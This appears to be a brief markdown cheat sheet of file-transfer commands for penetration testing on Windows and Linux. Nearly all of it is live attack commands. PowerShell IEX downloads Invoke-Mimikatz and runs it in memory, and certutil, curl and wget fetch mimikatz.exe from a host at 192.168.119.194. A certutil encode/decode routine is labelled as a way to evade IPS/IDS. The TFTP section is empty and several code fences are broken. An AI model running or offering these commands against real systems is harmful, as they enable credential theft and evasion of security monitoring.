# File-Transfert-Merthods

## Windows Methods

#### Powershell - Download in memory
```
IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.194:8000/Invoke-Mimikatz.ps1')
```

#### Powershell - Download in folder
Detected by Antivirus and SIEM tools such as Varonis
```
IEX (New-Object Net.WebClient).DownloadFile("http://192.168.119.194:8000/mimikatz.exe","C:\temp\mimikatz.exe")
```

#### TFTP 
On the old Windows version sur as Windows XP, Windows 2000
```

```

#### Certutil
```
\\ Basic transfert
certutil.exe -urlcache -split -f http://192.168.119.194:8000/mimikatz.exe output.file

\\ Encoded transfert - Basic IPS/IDS evasion
```
certutil -encode mimikatz.exe mimikatz.txt
certutil.exe -urlcache -split -f "http://192.168.119.194:8000/mimikatz.txt" mimikatz.txt
certutil.exe -decode mimikatz.txt mimikatz.exe
```

## Linux Methods

#### Curl
```
curl http://192.168.119.194:8000/mimikatz.exe --output mimikatz.exe
```

wget -O mimikatz.exe http://192.168.119.194:8000/mimikatz.exe

## Both Methods
